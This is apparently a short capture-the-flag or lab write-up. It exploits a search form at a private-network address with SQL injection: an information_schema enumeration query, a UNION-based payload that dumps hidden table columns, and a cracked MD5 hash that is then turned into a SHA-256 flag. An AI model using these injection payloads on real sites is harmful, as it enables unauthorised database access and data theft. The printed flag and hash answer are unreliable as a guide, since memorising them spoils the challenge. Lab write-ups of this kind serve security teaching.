We have a form to fill at the page "http://192.168.56.102/?page=searchimg".

It looks like backend use the input from it right in an SQL statement. So we can use it for an "injection".

Let's take a look on schema:

SELECT table_name, column_name FROM information_schema.columns

Now we know all the columns and names:

Let's see what is inside the hidden columns:

1 AND 1=2 UNION SELECT id, CONCAT(title, comment) FROM list_images;

1928e8083cf461a51303633093573c46 >> md5 >> albatroz >> lower() >> sh256 >> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
